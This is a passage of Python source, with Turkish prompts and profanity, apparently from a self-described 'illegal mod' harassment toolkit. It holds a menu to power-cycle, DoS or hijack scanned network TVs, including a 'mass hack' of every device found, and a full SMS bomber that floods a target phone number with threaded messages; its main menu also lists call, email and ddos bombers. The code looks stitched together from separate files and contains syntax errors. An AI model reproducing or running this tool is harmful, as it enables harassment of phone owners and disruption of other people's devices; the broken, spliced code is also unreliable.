        print("\n1 → Kapat (Power Off)")
        print("2 → Aç (WOL)")
        print("3 → DoS Saldır")
        print("4 → Video Yansıt")
        print("5 → Sürekli Hack (Loop)")
        print("6 → Geri")
        sec = input(Colors.YELLOW + "Seçim yap kanka: " + Colors.END).strip()
        if sec == "1":
            samsung_power_off(selected["ip"])
        elif sec == "2":
            advanced_wol(selected.get("mac"))
        elif sec == "3":
            dur = int(input("Süre (sn, default 30): ") or 30)
            dos_attack(selected["ip"], dur)
        elif sec == "4":
            url = input("Video URL gir (mp4 veya youtube): ")
            cast_video(selected["ip"], url)
        elif sec == "5":
            log("SÜREKLİ HACK BAŞLADI (Ctrl+C ile durdur)")
            try:
                while True:
                    samsung_power_off(selected["ip"])
                    advanced_wol(selected.get("mac"))
                    time.sleep(4)
            except KeyboardInterrupt:
                log("Sürekli hack durduruldu.")
        elif sec == "6":
            break

def main():
    load_config()
    print_banner()
    log("Shadow Flipper Pro v4.0 illegal mod başlatıldı.")
    while True:
        print(Colors.BOLD + "\n" + "="*80 + Colors.END)
        print("1 → Tara (Ağdaki TV'leri bul)")
        print("2 → Taramadan çıkanlardan seç ve hackle")
        print("3 → Kendi TV'm (192.168.1.103)")
        print("4 → Taramadan + Kendi TV ile MASS HACK")
        print("8 → Çıkış")
        print(Colors.BOLD + "="*80 + Colors.END)
        
        secim = input(Colors.YELLOW + "Seçim yap kanka: " + Colors.END).strip()

        if secim == "1":
            devices = aggressive_scan()
            for d in devices:
                if d not in TV_LIST:
                    TV_LIST.append(d)
            save_config()
            log(Colors.GREEN + f"{len(devices)} cihaz kaydedildi, hepsini sikeriz." + Colors.END)

        elif secim == "2":
            if not TV_LIST:
                log(Colors.RED + "Önce tarama yap lan!" + Colors.END)
                continue
            for i, tv in enumerate(TV_LIST):
                print(f"{i+1}) {tv.get('ip')} - {tv.get('name')} ({tv.get('brand')})")
            try:
                idx = int(input(Colors.YELLOW + "\nNumara: " + Colors.END)) - 1
                hack_menu(TV_LIST[idx])
            except:
                log("Hatalı seçim amk.")

        elif secim == "3":
            log("Kendi TV seçildi: 192.168.1.103")
            hack_menu(MY_TV)

        elif secim == "4":
            log(Colors.RED + "MASS ATTACK BAŞLIYOR - KENDİ TV + TARANANLAR SİKEYİM!" + Colors.END)
            devices = aggressive_scan()
            if MY_TV not in devices:
                devices.append(MY_TV)
            with ThreadPoolExecutor(max_workers=10) as executor:
                for dev in devices:
                    executor.submit(hack_menu, dev)
            log("Mass hack tamamlandı.")

        elif secim == "8":
            log(Colors.GREEN + "Görüşürüz sikeyim, TV'ler biraz dinlensin..." + Colors.END)
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log(Colors.GREEN + "\nScript kapatıldı amk." + Colors.END)
    except Exception as e:
        log(Colors.RED + f"Critic hata: {e}" + Colors.END)

    def sms_bomb(self):
        from colorama import Fore, Style
        from time import sleep
        from os import system
        from sms import SendSms
        import threading

        servisler_sms = []
        for attribute in dir(SendSms):
            attribute_value = getattr(SendSms, attribute)
            if callable(attribute_value):
                if attribute.startswith('__') == False:
                    servisler_sms.append(attribute)

        while 1:
            system("cls||clear")
            print("""{}

                                ⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄
                            ⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                            ⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏
                            ⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
                            ⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
                            ⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⡿⠿⠿⠿⠿⠋⠀
                            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠉⠉⠉⠉⠙⢿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⠹⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⠀⠈⠛⢿⡿⠂⠀⠀⠀⣀⣼⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀

                    Sms: {}           {}by {}@vastrel\n  
                    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
            try:
                menu = (input(
                    Fore.LIGHTMAGENTA_EX + " 1- SMS BOMB Gönder (Normal)\n\n 2- SMS BOMB Gönder (brutal)\n\n 3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
                if menu == "":
                    continue
                menu = int(menu)
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
                sleep(3)
                continue
            if menu == 1:
                system("cls||clear")
                print(
                    Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan,başında 0 olmadan ve birleşik yazınız (Birden çoksa 'enter' tuşuna basınız): " + Fore.LIGHTGREEN_EX,
                    end="")
                tel_no = input()
                tel_liste = []
                if tel_no == "":
                    system("cls||clear")
                    print(
                        Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: " + Fore.LIGHTGREEN_EX,
                        end="")
                    dizin = input()
                    try:
                        with open(dizin, "r", encoding="utf-8") as f:
                            for i in f.read().strip().split("\n"):
                                if len(i) == 10:
                                    tel_liste.append(i)
                        sonsuz = ""
                    except FileNotFoundError:
                        system("cls||clear")
                        print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
                        sleep(3)
                        continue
                else:
                    try:
                        int(tel_no)
                        if len(tel_no) != 10:
                            raise ValueError
                        tel_liste.append(tel_no)
                        sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"
                    except ValueError:
                        system("cls||clear")
                        print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.")
                        sleep(3)
                        continue
                system("cls||clear")
                try:
                    print(
                        Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): " + Fore.LIGHTGREEN_EX,
                        end="")
                    mail = input()
                    if ("@" not in mail or ".com" not in mail) and mail != "":
                        raise ValueError("Mail adresi düzgün değil amk, @ ve .com olmalı!")
                except:
                    system("cls||clear")
                    print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.")
                    sleep(3)
                    continue
                system("cls||clear")
                try:
                    print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: " + Fore.LIGHTGREEN_EX,
                          end="")
                    kere = input()
                    if kere:
                        kere = int(kere)
                    else:
                        kere = None
                except ValueError:
                    system("cls||clear")
                    print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
                    sleep(3)
                    continue
                system("cls||clear")
                try:
                    print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: " + Fore.LIGHTGREEN_EX,
                          end="")
                    aralik = int(input())
                except ValueError:
                    system("cls||clear")
                    print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
                    sleep(3)
                    continue
                system("cls||clear")
                if kere is None:
                    sms = SendSms(tel_no, mail)
                    while True:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    exec("sms." + attribute + "()")
                                    sleep(aralik)
                for i in tel_liste:
                    sms = SendSms(i, mail)
                    if isinstance(kere, int):
                        while sms.adet < kere:
                            for attribute in dir(SendSms):
                                attribute_value = getattr(SendSms, attribute)
                                if callable(attribute_value):
                                    if attribute.startswith('__') == False:
                                        if sms.adet == kere:
                                            break
                                        exec("sms." + attribute + "()")
                                        sleep(aralik)
                print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
                input()
            elif menu == 3:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
                break
            elif menu == 2:
                system("cls||clear")
                print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: " + Fore.LIGHTGREEN_EX,
                      end="")
                tel_no = input()
                try:
                    int(tel_no)
                    if len(tel_no) != 10:
                        raise ValueError
                except ValueError:
                    system("cls||clear")
                    print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.")
                    sleep(3)
                    continue
                system("cls||clear")
                try:
                    print(
                        Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): " + Fore.LIGHTGREEN_EX,
                        end="")
                    mail = input()
                    if ("@" not in mail or ".com" not in mail) and mail != "":
                        raise ValueError("Mail adresi düzgün değil amk, @ ve .com olmalı!")
                except:
                    system("cls||clear")
                    print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.")
                    sleep(3)
                    continue
                system("cls||clear")
                send_sms = SendSms(tel_no, mail)
                dur = threading.Event()

                def Turbo():
                    while not dur.is_set():
                        thread = []
                        for fonk in servisler_sms:
                            t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                            thread.append(t)
                            t.start()
                        for t in thread:
                            t.join()

                try:
                    Turbo()
                except KeyboardInterrupt:
                    dur.set()
                    system("cls||clear")
                    print("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")
                    sleep(2)


    def show_history(self):
        self.clear()
        print(Fore.CYAN + "\n=== SCAN TARİHÇESİ ===\n")
        if not self.scan_history:
            print(Fore.YELLOW + "Henüz işlem yapılmadı.")
        else:
            for i, entry in enumerate(reversed(self.scan_history[-20:]), 1):
                print(Fore.WHITE + f"{i:2d}. {entry}")
        input(Fore.YELLOW + "\nEnter ile devam...")

    def log(self, activity):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {activity}\n")

    def main_menu(self):
        while True:
            self.main_banner()
            print(Fore.CYAN + "1. Call Bomber")
            print(Fore.CYAN + "2. Sms Bomber")
            print(Fore.CYAN + "3. Cmd Bomb(for pc)")
            print(Fore.CYAN + "4. Gmail Bomber")
            print(Fore.CYAN + "5. password generator")
            print(Fore.CYAN + "6. ip info ")
            print(Fore.CYAN + "7. ddos attack")
            print(Fore.CYAN + "8. tv hack(control)
            print(Fore.CYAN + "9. show history/log geçmişi")
            print(Fore.CYAN + "10. exit/çıkış")

            secim = input(Fore.YELLOW + "\nSeçim → " + Style.RESET_ALL)

            if secim == "1":
                self.call_bomber()
            elif secim == "2":
                self.sms_bomb()
            elif secim == "3":
                self.cmd_bomber()
            elif secim == "4":
                self.email_bomber()
            elif secim == "5":
                self.password_generator()
            elif secim == "6":
                self.ip_info()
            elif secim == "7":
                self.ddos_attack()
            elif secim == "8":
                self.tv_hack()
            elif secim == "9":
                 self.show_history()
            elif secim == "10":
              print(Fore.RED + "\nGörüşürüz Ghost...")
                sys.exit(0)
            else:
                print(Fore.RED + "Geçersiz seçim.")

    def run(self):
        self.main_menu()


if __name__ == "__main__":
    try:
        VASTREL()
    except KeyboardInterrupt:
        print(Fore.RED + "\nGörüşürüz piç..." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
